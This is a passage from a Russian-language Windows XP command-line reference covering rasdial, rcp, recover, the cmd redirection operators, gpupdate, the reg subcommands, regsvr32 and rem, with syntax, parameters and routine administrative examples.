    Заменяет номер телефона для ответного вызова, заданный для записи из файла телефонной книги Rasphone.pbk.
/phonebook:путь_к_телефонной_книге
    Задает путь к файлу телефонной книги. По умолчанию задан системный_корневой_каталог\System32\Ras\имя_пользователя.pbk. Можно указать полный путь к файлу.
/prefixsuffix
    Применяет к набираемому номеру телефона параметры набора номера TAPI для текущего местоположения. Эти параметры настраиваются в телефонной службе с помощью компонента "Параметры телефона и модема", находящегося на панели управления. По умолчанию этот параметр отключен.
/disconnect
    Данный параметр требуется при отключении. Отключает заданное подключение. Отключение также выполняется с помощью ввода параметра /d.

Примечания
- Команда rasdial не поддерживает следующие функции Rasphone.exe: - Записи, требующие ввода данных в терминальном режиме в процессе набора номера.- Набор номера через оператора или вручную.
Примеры

В примере показано подключение к записи OFFICE файла телефонной книги Rasphone.pbk.

rasdial office

В примере показано подключение к записи OFFICE 2 файла телефонной книги Rasphone.pbk с заданием номера обратного вызова.

rasdial "office 2" /callback:555-0100

В примере показано отключение от записи EAST OFFICE.

rasdial "EAST OFFICE" /d


========================================================================================
Rcp

Копирует файлы между компьютером c системой Windows XP и компьютером, на котором запущен сервер rshd. Windows XP и Windows 2000 не работают с rshd. Команда rcp, запущенная без параметров, выводит справку.
Синтаксис

rcp [{-a | -b}] [-h] [-r] [узел][.пользователь:] [источник] [узел][.пользователь:] [путь\точка_назначения]
Параметры

-a
    Задает режим передачи (ASCII). В этом режиме символ конца строки для систем UNIX заменяется символом возврата каретки, а для персональных компьютеров — парой возврат каретки /перевод строки. Этот режим используется по умолчанию.
-b
    Задает режим передачи двоичных файлов. Преобразование комбинации возврат каретки/перевод строки не выполняется.
-h
    Передает исходные файлы с атрибутом «скрытый» на компьютер с Windows XP. В противном случае скрытые файлы не копируются.
-r
    Рекурсивно копирует в точку назначения все каталоги источника.
узел
    Задает имя локального или удаленного узла. Если узел задан с помощью IP-адреса или имя узлового компьютера содержит точки (.), необходимо задать пользователя.
пользователь
    Задает имя пользователя Если имя пользователя не задано, то используется имя текущего пользователя, вошедшего в систему.
источник
    Задает файлы для копирования.
путь\точка_назначения
    Задает путь каталога для входа в систем на удаленном узле. Для задания пути на удаленном компьютере используются подстановочные знаки (\ , " или '). При задании нескольких исходных файлов точкой назначения является каталог.
/?
    Отображает справку в командной строке.

Примечания
- Передача данных кому-либо еще ( третьей стороне).

Команду rcp, осуществляющую подключение, можно также использовать для передачи файлов третьй стороне. Команду rcp можно запустить с компьютера с системой Windows XP для копирования файлов между двумя компьютерами, на которых запущены серверы rshd. Сервер (демон) rshd доступен на компьютерах с системой UNIX, поэтому компьютер под управлением Windows XP при передаче данных третьей стороне может выступать только в роли компьютера, с которого запускаются команды.
- Использование параметра -r

И источник, и путь\точка_назначения должны быть каталогами. Если источник не является каталогом, параметр -r можно использовать без рекурсии.
- Использование параметров источник и путь\точка_назначения

Если имя файла не начинается с косой черты (/) для системы UNIX или обратной косой черты (\) для системы Windows XP, предполагается, что местоположение файла указано относительно текущего рабочего каталога. Для системы Windows XP — это каталог, из которого запущена команда. Для удаленной системы — это каталог входа удаленного пользователя в систему. Точка (.) указывает на текущий каталог. При задании пути на удаленном компьютере для указания подстановочных знаков следует использовать управляющие символы (\ , " или ').
- Права доступа на удаленной системе

Команда rcp не запрашивает пароль. Имя текущего или заданного пользователя должно существовать на удаленном компьютере и допускать выполнение команды rcp.
- Файл .rhosts

Файл .rhosts задает имена удаленных систем и пользователей, которым разрешен доступ к локальным ресурсам с использованием команд rsh или rcp. Этот файл (или его эквивалент, HOSTS) требуется для доступа к удаленной системе, использующей эти команды. Команды rsh и rcp, передают имя локального пользователя удаленной системе. Удаленная система использует это имя и IP-адрес (обычно сопоставляемый с именем компьютера) запрашиваемой системы для предоставления доступа. Пароль для доступа к ресурсам с использованием этих команд не требуется.

Если пользователь подключен к домену, основной контроллер домена должен быть доступен для сопоставления имени входа в систему, так как имя не кэшируется на локальном компьютере. Поскольку имя пользователя является частью протокола rsh, команда не будет выполняться, если его нельзя получить.

Файл .rhosts — это текстовый файл, каждая строка которого является записью. Запись включает имя локального компьютера, имя локального пользователя и произвольный комментарий. Каждое поле отделяется символом табуляции или пробелом, комментарий начинается со знака (#), например:

computer5marie #Этот компьютер находится в комнате 31A

Файл .rhosts должен находиться в основном каталоге пользователя на удаленном компьютере. Дополнительные сведения о специфическом использовании файла .rhosts на удаленном компьютере см. в документации удаленного компьютера.

Кроме того, можно добавить имя компьютера в файл /Etc/Hosts на удаленном компьютере. Это позволит удаленной системе проверять подлинность удаленных запросов к компьютеру с использованием TCP/IP-утилит Windows XP.
- Задание имен компьютеров (узлов)

Для использования имени пользователя, отличающегося от имени текущего пользователя задайте компьютер.пользователь. Если параметр компьютер.пользователь задан вместе с источником, файл .rhosts на удаленном компьютере должен содержать следующую запись для пользователя :

rcp host99.user7:file1 corp7.admin:file2

Файл .rhosts на компьютере corp7 должен иметь запись для пользователя user7 , подключенного к компьютеру host99.

Если имя компьютера задано как полное доменное имя, содержащее точки, имя пользователя должно быть добавлено к имени компьютера, как было описано выше. Иначе последняя часть имени домена будет рассматриваться как имя пользователя, как показано ниже:

rcp domain-name1.user:user92 domain-name2.user:user7
- Удаленная обработка

На большинстве систем UNIX удаленная обработка производится командой, запускаемой пользовательской оболочкой. Файлы .profile или .cshrc исполняются до анализа имен файлов, что позволяет использовать экспортируемые переменные оболочки (выделяя их кавычками или управляющими символами) в именах файлов удаленной системы.
- Копирование файлов

При попытке копировать несколько файлов в файл, а не в каталог, будет скопирован только последний файл из списка. Команда rcp не копирует файл сам в себя (источник и точка назначения не должны быть одинаковыми.)

Если пользователь подключен к компьютеру с Windows XP Professional с помощью имени домена, отличного от локального, а основной контроллер домена недоступен, то при команда rcp сбойнет, так как не сможет определит локальное имя пользователя. Это же ограничение действует и для команды rsh.
- Эта команда доступна только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Для копирования локального файла в каталог подключения удаленного компьютера введите:

rcp filename remotecomputer:

Для копирования локального файла в существующий каталог с новым именем файла на удаленном компьютере введите:

rcp filename remotecomputer:/directory/newfilename

Для копирования нескольких локальных файлов в подкаталог в удаленном каталоге подключения введите:

rcp file1 file2 file3 remotecomputer:subdirectory/filesdirectory

Для копирования из удаленного источника в текущий каталог на локальном компьютере введите:

rcp remotecomputer:filename

Для копирования нескольких файлов с удаленных компьютеров на удаленный компьютер с другим именем пользователя введите:

rcp remote1.user1:file1 remote2.user2:file2 remotedest.destuser:directory
========================================================================================
Recover

Восстанавливает сохранившуюся на испорченных или дефектных дисках информацию.
Синтаксис

recover [диск:][путь] имя_файла
Параметры

[диск:][путь] имя_файла
    Задает местонахождение и имя файла, который подлежит восстановлению.
/?
    Отображает справку в командной строке.

Примечания
- Команда recover считывает файл сектор за сектором и восстанавливает информацию, которая еще может быть считана. Данные в поврежденных секторах будут утеряны. - Ограничения на параметр [диск:][путь]имя_файла

Использование подстановочных знаков (* и ?) в команде recover не допускается. Должно быть указано имя файла.
- Новый ввод потерянных данных

Так как все данные в испорченных секторах будут потеряны, файлы следует восстанавливать по одному. После процедуры восстановления требуется отредактировать каждый файл и снова ввести в него потерянную информацию.
- Восстановление испорченных секторов

Поврежденные сектора, о которых сообщает команда chkdsk, были маркированы при первом форматировании диска. Они не представляют опасности и команда recover не будет обращать на них внимание.
Примеры

Для восстановления файла Story.txt из каталога \Fiction на диске D: введите:

recover d:\fiction\story.txt
========================================================================================
Использование операторов перенаправления команд

Операторы перенаправления команд используются для изменения местоположений потоков ввода и вывода команд, заданных по умолчанию, на какие-либо другие. Местоположение потоков ввода и вывода называется дескриптор.

В следующей таблице описаны операторы перенаправления потоков ввода и вывода команд.
Оператор перенаправления     Описание
>     Записывает данные на выходе команды вместо командной строки в файл или на устройство, например, на принтер.
<     Читает поток входных данных команды из файла, а не с клавиатуры.
>>     Добавляет выходные данные команды в конец файла, не удаляя при этом существующей информации из файла.
>&     Считывает данные на выходе одного дескриптора как входные данные для другого дескриптора.
<&     Считывает входные данные одного дескриптора как выходные данные другого дескриптора.
|     Считывает выходные данные одной команды и записывает их на вход другой команды. Эта процедура известна под названием «канал».

По умолчанию, входные данные команды (дескриптор STDIN) отсылаются с клавиатуры интерпретатору команд Cmd.exe, далее Cmd.exe отправляет выходные данные команды (дескриптор STDOUT) в окно командной строки.

В следующей таблице представлены доступные дескрипторы.
дескриптор     Числовой эквивалент дескриптора     Описание
STDIN     0     Ввод с клавиатуры
STDOUT     1     Вывод в окно командной строки
STDERR     2     Ошибка вывода в окно командной строки
UNDEFINED     3-9     Эти дескрипторы определяются индивидуально для каждой прикладной программы.

Номера от 0 до 9 представляют первые 10 дескрипторов. Для запуска программы и перенаправления любого из 10 дескрипторов используется интерпретатор команд Cmd.exe. Для задания требуемого дескриптора перед оператором перенаправления введите его номер. Если дескриптор не определен, то по умолчанию оператором перенаправления ввода «<» будет ноль (0), а оператором перенаправления вывода «>» будет единица (1). После ввода оператора «<» или «>» необходимо указать, откуда читать и куда записывать данные. Можно задать имя файла или любой из существующих дескрипторов.

Для задания перенаправления в существующие дескрипторы используется амперсанд (&), затем номер требуемого дескриптора (например, &номер_дескриптора). Например, для перенаправления дескриптора 2 (STDERR) в дескриптор 1 (STDOUT) введите:

1<&2
Дублирование дескрипторов

Оператор перенаправления «&» дублирует выходные или входные данные с одного заданного дескриптора на другой заданный дескриптор. Например, для отправки выводных данных команды dir в файл File.txt и отправки ошибки вывода в файл File.txt введите:

dir>c:\file.txt 2>&1

При дублировании дескриптора происходит копирование всех его исходных характеристик. Например, если дескриптор доступен только для записи, то все его дубликаты будут доступны только для записи. Нельзя продублировать дескриптор с доступом только для чтения в дескриптор с доступом только для записи.
Перенаправление ввода команд (<)

Для перенаправления ввода команд с цифровой клавиатуры на файл или на устройство используйте оператор «<». Например, для ввода команды sort из файла List.txt введите:

sort<file.txt

Содержимое файла File.txt появится в командной строке в виде списка в алфавитном порядке.

Оператор «<» открывает заданное имя файла с доступом только для чтения. Поэтому с его помощью нельзя записывать в файл. Например, при запуске программы с оператором <&2 все попытки прочитать дескриптор 0 ни к чему не приведут, так как изначально он был открыт с доступом только для записи.

Примечание
- Дескриптор 0 задан по умолчанию для оператора перенаправления ввода «<».
Перенаправление вывода команд (>)

Выходные данные практически всех команд высвечиваются в окне командной строки. Даже команды, выводящие данные на диск или принтер, выдают сообщения и запросы в окне командной строки.

Для перенаправления вывода команд из окна командной строки в файл или на устройство применяется оператор «>». Этот оператор используется с большинством команд. Например, для перенаправления вывода команды dir в файл Dirlist.txt введите:

dir>dirlist.txt

Если файл Dirlist.txt не существует, интерпретатор команд Cmd.exe создаст его. Если файл существует, Cmd.exe заменит информацию в файле на данные, полученные от команды dir.

Для запуска команды netsh routing dump и последующей отправки результатов ее работы в Route.cfg введите:

netsh routing dump>c:\route.cfg

Оператор «>» открывает заданный файл с доступом только для записи. Поэтому с помощью данного оператора файл прочитать нельзя. Например, при запуске программы с оператором перенаправления <&0 все попытки записать дескриптор 1 ни к чему не приведут, так как изначально дескриптор 0 был открыт с доступом только для чтения.

Примечание.
- Дескриптор 1 задан по умолчанию для оператора перенаправления вывода «>».
Использование оператора «<&» для перенаправления ввода и дублирования

Для использования оператора перенаправления ввода необходимо, чтобы задаваемый файл уже существовал. Если файл для ввода существует, то интерпретатор команд Cmd.exe открывает его с доступом только для чтения и его содержимое отправляет в команду так, как если бы это был ввод с цифровой клавиатуры. При задании дескриптора интерпретатор команд Cmd.exe дублирует его в дескриптор, существующий в системе.

Например, для считывания файла File.txt на вход в дескриптор 0 (STDIN) введите:

<file.txt

Для открытия файла File.txt, сортировки его содержимого и последующей отправки в окно командной строки (STDOUT) введите:

sort<file.txt

Для того чтобы найти файл File.txt и перенаправить дескриптор 1 (STDOUT) и дескриптор 2 (STDERR) в Search.txt введите:

findfile file.txt>search.txt 2<&1

Для дублирования определенного пользователем дескриптора 3 в качестве входной информации для дескриптора 0 (STDIN) введите:

<&3
Использование оператора «>&» для перенаправления ввода и дублирования

При перенаправлении вывода в файл и задании существующего имени файла интерпретатор команд Cmd.exe открывает файл с доступом только для записи и переписывает его содержимое. Если дескриптор задан, интерпретатор команд Cmd.exe дублирует файл в существующий дескриптор.

Для дублирования определенного пользователем дескриптора 3 в дескриптор 1 введите:

>&3

Для перенаправления всех выходных данных, включая выходные данные дескриптора 2 (STDERR), команды ipconfig в дескриптор 1 (STDOUT) и последующего перенаправления выходных данных в Output.log введите:

ipconfig.exe>>output.log 2>&1
Использование оператора «>>» для добавления вывода

Для добавления выходных данных команды в конец файла без потери хранящейся в нем информации используется двойной символ «больше» (>>). Например, следующая команда добавляет список каталогов, созданный командой dir, в файл Dirlist.txt:

dir>>dirlist.txt

Для добавления выходных данных команды netstat в конец файла Tcpinfo.txt введите:

netstat>>tcpinfo.txt
Использование оператора канала (|)

Оператор канала «вертикальная линия» (|) забирает выходные данные одной команды (по умолчанию STDOUT) и направляет их на вход другой команды (по умолчанию STDIN). Например, следующая команда сортирует каталог:

dir | sort

В данном примере обе команды запускаются одновременно, но команда sort приостанавливает работу до получения выходных данных команды dir. Команда sort использует выходные данные команды dir в качестве своих входных данных, а затем свои выходные данные отправляет в дескриптор 1 (STDOUT).
Комбинирование команд с операторами перенаправления

Комбинируя команды-фильтры с другими командами и именами файлов, можно создавать команды на заказ. Например, для сохранения имен файлов, содержащих строку «LOG», используется следующая команда:

dir /b | find "LOG" > loglist.txt

Выход команды dir отсылается в команду-фильтр find. Имена файлов, содержащие строку «LOG», хранятся в файле Loglist.txt в виде списка (например, NetshConfig.log, Logdat.svd и Mylog.bat).

При использовании более одного фильтра в одной команде их необходимо отделять с помощью канала (|). Например, следующая команда ищет в каждом каталоге диска C файлы, в названии которых присутствует строка «Log», и выводит их постранично на экран:

dir c:\ /s /b | find "LOG" | more

Наличие канала (|) указывает Cmd.exe, что выход команды dir нужно отправить команде-фильтру find. Команда find выбирает только те имена файлов, в которых содержится строка «LOG». Команда more выводит на экран имена файлов, полученные командой find с паузой после заполнения каждого экрана. Дополнительные сведения о командах-фильтрах см. в разделе Использование фильтров.
========================================================================================
Gpupdate

Обновляет локальные параметры и параметры групповой политики Active Directory, включая параметры безопасности. Эта команда заменяет устаревший параметр /refreshpolicy команды secedit.
Синтаксис

gpupdate [/target:{computer|user}] [/force] [/wait:значение] [/logoff] [/boot]
Параметры

/target:{computer|user}
    Обрататывает только параметры компьютера или параметры текущего пользователя. По умолчанию обрабатываются и параметры компьютера, и параметы пользователя.
/force
    Игнориует все оптимизации в процессе обработки и восстанавливает все предыдущие настройки.
/wait:значение
    Время ожидания окончания обработки политики в секундах. По умолчанию это время составляет 600 секунд. 0 означает «без ожидания»; -1 означает «время ожидания не ограничено».
/logoff
    Задает выход из системы по завершении обновления. Это необходимо для тех клиентских расширений оснастки «Групповая политика», которые обрабатываются не в фоновом режиме, а при входе пользователя в систему, например, при установке программного обеспечения и перенаправлении папок. Этот параметр не работает, если вызываемые расширения, необходимые для выхода пользователя из системы, отсутствуют.
/boot
    Перезапускает компьютер после завершения обновления. Это необходимо для тех клиентских расширений оснастки «Групповая политика», которые обрабатываются не в фоновом режиме, а при входе пользователя в систему, например, при установке программного обеспечения и перенаправлении папок. Этот параметр не работает, если вызываемые расширения, необходимые для перезапуска компьютера, отсутствуют.
/?
    Вывод справки в командной строке.

Примечания
- Если допущена синтаксическая ошибка, то подобно данному разделу справки выводится синтаксическая сводка.
Примеры

Далее приведены примеры использования команды gpupdate:

gpupdate

gpupdate /target:computer

gpupdate /force /wait:100

gpupdate /boot
========================================================================================
Reg

Добавляет, изменяет и отображает на экране информацию разделов реестра и значение записей реестра.

Для просмотра синтаксиса команды щелкните ее:

reg add

Добавляет новый раздел или новую запись в реестр.
Синтаксис

reg add имя_раздела [/v имя_записи|/ve] [/t тип_данных] [/s разделитель] [/d значение] [/f]
Параметры

имя_раздела
    Задает полный путь к разделу. Для удаленных компьютеров перед путем к разделу в формате \\имя_компьютера\путь_к_разделу вставляется имя компьютера. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC.
/v имя_записи
    Задает имя записи для добавления к заданному разделу.
/ve
    Задает нулевое значение для записи, добавляемой в реестр.
/t тип_данных
    Задает тип данных для значения записи. Параметр тип_данных может иметь одно из перечисленных ниже значений:

    REG_SZ

    REG_MULTI_SZ

    REG_DWORD_BIG_ENDIAN

    REG_DWORD

    REG_BINARY

    REG_DWORD_LITTLE_ENDIAN

    REG_LINK

    REG_FULL_RESOURCE_DESCRIPTOR

    REG_EXPAND_SZ
/s разделитель
    Задает символы для разделения копий данных. Используется при задании REG_MULTI_SZ в качестве типа данных и при размещении более одной записи в списке. Если разделитель не задан, то используется разделитель \0, заданный по умолчанию.
/d значение
    Задает значение для новой записи реестра.
/f
    Добавляет раздел или запись без запроса на подтверждение.
/?
    Вывод справки в командной строке.

Примечания
- С помощью данной операции нельзя добавлять поддеревья. Эта версия регистра не запрашивает подтверждения при добавлении нового раздела.- В следующей таблице представлены значения возврата для операции reg add.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg add.

reg add \hklm\software\myco /v data /t reg_binary /d fe340ead
reg add "hkcu\software\microsoft\winmine" /v Name3 /t reg_sz /d Anonymous
reg add "hkcu\software\microsoft\winmine" /v Time3 /t reg_dword /d 5

reg compare

Сравнивает заданные разделы или записи реестра.
Синтаксис

reg compare имя_раздела_1 имя_раздела_2 [/v имя_записи | /ve] {[/oa]|[/od]|[/os]|[on]} [/s]
Параметры

имя_раздела
    Задает полный путь к разделу. Для удаленных компьютеров имя компьютера вставляется перед путем к разделу в формате \\имя_компьютера\путь_к_разделу. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC. Если задан удаленный компьютер, то можно использовать только поддеревья HKLM и HKU.
/v имя_записи
    Сравнивает специальную запись раздела.
/ve
    Задает для сравнения только те записи, которые не имеют значения.
{[/oa]|[/od]|[/os]|[on]}
    Задает вывод различий и совпадений. По умолчанию установлено значение /od.
    Значение     Описание
    /oa     Задает вывод всех различий и совпадений. По умолчанию отображаются только различия.
    /od     Задает вывод различий. Этот вариант используется по умолчанию.
    /os     Задает вывод совпадений. По умолчанию отображаются только различия.
    /on     На экран ничего не выводится. По умолчанию отображаются только различия.
/s разделитель
    Сравнивает все разделы и записи.
/?
    Вывод справки в командной строке.

Примечания
- В следующей таблице представлены значения возврата для операции reg compare.
Значение     Описание
0     Сравнение успешно и результаты совпадают.
1     Сравнение не прошло.
2     Сравнение прошло успешно и найдены различия.
Примеры

Далее приведены примеры использования команды reg compare.

reg compare "hkcu\software\microsoft\winmine" "hkcu\software\microsoft\winmine" /od /s

reg copy

Копирует запись реестра в заданный каталог локального или удаленного компьютера.
Синтаксис

reg copy имя_раздела_1 имя_раздела_2 [/s] [/f]
Параметры

имя_раздела_1
    Задает полный путь к разделу для копирования. Для удаленных компьютеров перед путем к разделу в формате \\имя_компьютера\путь_к_разделу вставляется имя компьютера. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC. Если задан удаленный компьютер, то можно использовать только поддеревья HKLM и HKU.
имя_раздела_2
    Задает полный путь к разделу точки назначения. Для удаленных компьютеров перед путем к разделу в формате \\имя_компьютера\путь_к_разделу вставляется имя компьютера. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC. Если задан удаленный компьютер, то можно использовать только поддеревья HKLM и HKU.
/s
    Копирует все вложенные разделы и записи заданного раздела.
/f
    Копирует раздел без запроса на подтверждение.
/?
    Вывод справки в командной строке.

Примечания
- Эта версия команды Reg не запрашивает подтверждения при копировании раздела.- В следующей таблице представлены значения возврата для операции reg copy.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg copy:

reg copy "hkcu\software\microsoft\winmine" "hkcu\software\microsoft\winminebk" /s /f
reg copy "hkcu\software\microsoft\winminebk" "hkcu\software\microsoft\winmine" /s

reg delete

Удаляет раздел или записи реестра.
Синтаксис

reg delete имя_раздела [{/v имя_записи|/ve|/va}] [/f]
Параметры

имя_раздела
    Задает полный путь к разделу. Для удаленных компьютеров перед путем к разделу в формате \\имя_компьютера\путь_к_подразделу вставляется имя компьютера. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC.
/v имя_записи
    Удаляет запись раздела. Если запись не задана, то будут удалены все записи и вложенные разделы данного раздела.
/ve
    Задает для удаления только те записи, которые не имеют значения.
/va
    Удаляет все записи заданного раздела. Данный параметр не удаляет вложенные разделы в заданном разделе.
/f
    Удаляет существующий раздел реестра или запись без запроса на подтверждение.
/?
    Вывод справки в командной строке.

Примечания
- В следующей таблице представлены значения возврата для операции reg copy.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg delete.

reg delete "hkcu\software\microsoft\winmine" /v Name1
reg delete "hkcu\software\microsoft\winmine" /v Time1
reg delete "hkcu\software\microsoft\winmine" /va

reg export

Создает копию заданных разделов, записей или значений в файле, который можно отправить на другие серверы.
Синтаксис

reg export имя_раздела имя_файла
Параметры

имя_раздела
    Задает полный путь к разделу. Операция export работает только на локальном компьютере. Путь начинается с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC.
имя_файла
    Задает имя и путь экспортируемого файла. Файл должен иметь расширение .reg.
/?
    Вывод справки в командной строке.

Примечания
- В следующей таблице представлены значения возврата для операции reg export.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg export.

reg export "hkcu\software\microsoft\winmine" c:\data\regbackups\wmbkup.reg

reg import

Копирует разделы, записи и значения из экспортированного реестра в реестр локального компьютера.
Синтаксис

reg import имя_файла
Параметры

имя_файла
    Задает имя и путь файла для копирования в реестр локального компьютера. Предварительно с помощью операции reg export этот файл требуется создать.
/?
    Вывод справки в командной строке.

Примечания
- В следующей таблице представлены значения возврата для операции reg import.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg import.

reg import "hkcu\software\microsoft\winmine" c:\data\regbackups\wmbkup.reg

reg load

Записывает сохраненные разделы и записи в другой раздел реестра. Предполагается, что это будет временный файл для устранения неполадок или редактирования записей реестра.
Синтаксис

reg load имя_раздела имя_файла
Параметры

имя_раздела
    Задает полный путь к разделу. Для удаленных компьютеров перед путем к разделу в формате \\имя_компьютера\путь_к_подразделу вставляется имя компьютера. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC.
имя_файла
    Задает путь и имя файла, который будет загружен. Этот файл должен быть создан заранее с помощью операции reg save и с расширением .hiv.
/?
    Вывод справки в командной строке.

Примечания
- В следующей таблице представлены значения возврата для операции reg load.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg load.

reg load "hkcu\software\microsoft\winminebk2" wmbkup.hiv

reg query

Возвращает список следующего уровня вложенных разделов и записей, находящихся в разделе реестра.
Синтаксис

reg query имя_раздела [{/v имя_записи|/ve}] [/s]
Параметры

имя_раздела
    Задает полный путь к разделу. Для удаленных компьютеров перед путем к разделу в формате \\имя_компьютера\путь_к_подразделу вставляется имя компьютера. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC. Если задан удаленный компьютер, то можно использовать только поддеревья HKLM и HKU.
/v имя_записи
    Возвращает запись и ее значение. Этот параметр возвращает только те записи, которые находятся непосредственно под заданным разделом. Записи из вложенных разделов, находящихся под текущим разделом, не выводятся. Если имя_записи пропущено, то возвращаются все записи, находящиеся в данном разделе.
/ve
    Задает только те записи, которые не имеют значения.
/s
    Возвращает все разделы и записи во все уровни. Без этого параметра будет возвращен только следующий уровень разделов и записей.
/?
    Вывод справки в командной строке.

Примечания
- В следующей таблице представлены значения возврата для операции reg query.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg query.

reg query "hklm\system\currentcontrolset\control\session manager" /v maxstacktracedepth

reg query "hkcu\software\microsoft\winmine" /s

reg restore

Записывает сохраненные вложенные разделы и записи обратно в раздел реестра.
Синтаксис

reg restore имя_раздела имя_файла
Параметры

имя_раздела
    Задает полный путь к разделу. Операция restore работает только на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC.
имя_файла
    Задает путь и имя файла, который будет обратно записан в реестр. Файл должен быть создан заранее с помощью операции reg save с расширением .hiv.
/?
    Вывод справки в командной строке.

Примечания
- Эта операция используется для перезаписывания отредактированных записей реестра. Перед редактированием записей родительский раздел необходимо сохранить с помощью операции reg save. В случае сбоя редактирования с помощью описанной выше операции этот раздел можно восстановить.- В следующей таблице представлены значения возврата для операции reg restore.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg restore.

reg restore "hkcu\software\microsoft\winmine" wmbkup.hiv

reg save

Сохраняет копии заданных разделов, записей и значений реестра в заданном файле.
Синтаксис

reg save имя_раздела имя_файла
Параметры

имя_раздела
    Задает полный путь к разделу. Для удаленных компьютеров перед путем к разделу в формате \\имя_компьютера\путь_к_подразделу вставляется имя компьютера. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC.
имя_файла
    Задает путь и имя файла, который будет создан. Если путь не задан, используется текущий путь.
/?
    Вывод справки в командной строке.

Примечания
- В следующей таблице представлены значения возврата для операции reg save.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg save.

reg save "hkcu\software\microsoft\winmine" wmbkup.hiv

reg unload

Удаляет раздел реестра, загруженного с помощью операции reg load.
Синтаксис

reg unload имя_раздела
Параметры

имя_раздела
    Задает полный путь к разделу. Для удаленных компьютеров перед путем к разделу в формате \\имя_компьютера\путь_к_подразделу вставляется имя компьютера. Если параметр имя_компьютера не задан, операция по умолчанию выполняется на локальном компьютере. Путь следует начинать с соответствующего поддерева. Допустимыми поддеревьями являются HKLM, HKCU, HKCR, HKU и HKCC.
/?
    Вывод справки в командной строке.

Примечания
- В следующей таблице представлены значения возврата для операции reg unload.
Значение     Описание
0     Успех
1     Сбой
Примеры

Далее приведены примеры использования команды reg unload.

reg unload "hkcu\software\microsoft\winminebk2"

Внимание!
- Ошибка при изменении реестра может серьезно повредить систему. Перед изменением реестра создайте резервную копию всех важных данных.

Внимание!
- Не редактируйте реестр до тех пор, пока не останется никакой альтернативы. Редактор реестра обходит стандартную защиту, настраивая параметры, которые вызывают снижение производительности, повреждение системы и даже требуют переустановить Windows. Для обеспечения безопасности большинство параметров реестра можно удалить с помощью программы панели управления или консоли MMC. Если требуется напрямую отредактировать реестр, то перед этим обязательно нужно сделать резервную копию. Дополнительные сведения смотрите в справке по редактору реестра.
Примечания
- Использование команды Reg напрямую редактирует реестр локального или удаленного компьютеров. Эти изменения могут привести компьютер в нерабочее состояние и даже к необходимости установки операционной системы заново. Для внесения изменений в реестр вместо прямого его редактирования по возможности используйте панель управления или консоль ММС.- Некоторые операции допускают просмотр или настройку записей реестра на локальном или удаленном компьютерах, а другие - только настройку на локальных компьютерах. Кроме того, удаленный доступ к реестру может сделать недоступными некоторые параметры. Для того чтобы убедиться, что данную операцию и данные параметры можно использовать соответственно на удаленном компьютере и в данной ситуации, проверьте синтаксис каждой операции. ========================================================================================
Regsvr32

Данная команда регистрирует в реестре файлы .dll как компоненты команды.
Синтаксис

regsvr32 [/u] [/s] [/n] [/i[:cmdline]] имя_dll
Параметры

/u
    Отменяет регистрацию сервера.
/s
    Задает запуск regsvr32 без вывода сообщений на экран.
/n
    Указывает не вызывать DllRegisterServer. Этот параметр можно использовать с параметром /i.
/i:cmdline
    Вызывает DllInstall с помощью дополнительной передачи [cmdline]. При использовании с параметром /u вызывает удаление dll.
dllname
    Задает имя файла dll для последующей регистрации.
/?
    Вывод справки в командной строке.

Примеры

Для регистрации файла .dll для схемы Active Directory введите:

regsvr32 schmmgmt.dll
========================================================================================
Rem

Добавляет комментарии в пакетные файлы или файлы настройки.
Синтаксис

rem [текст]
Параметры

текст
    Задает строку символов, используемую в качестве комментария.
/?
    Вывод справки в командной строке.

Примечания
- Вывод комментариев с помощью команды echo

Команда rem не выводит комментарии на экран. Для вывода комментариев на экран необходимо использовать команду echo on в пакетных файлах или в файле Config.nt.
- Ограничения на комментарии в пакетных файлах

В тексте комментариев нельзя использовать символы перенаправления (< или >) или канала (|).
- Использование команды rem для добавления вертикальных пробелов.

Вместо команды rem, которая без текста комментария применяется для добавления вертикальных пробелов в пакетный файл, можно просто использовать пустые строки. При обработке пакетной программы пустые строки пропускаются.
Примеры

Следующий пример показывает применение комментариев и вертикальных пробелов в пакетном файле.

@echo off
rem Эта пакетная программа форматирует и проверяет новые диски.
rem Она называется CHECKNEW.BAT.
rem
echo Вставьте новый диск в дисковод B.
pause
format b: /v
chkdsk b:

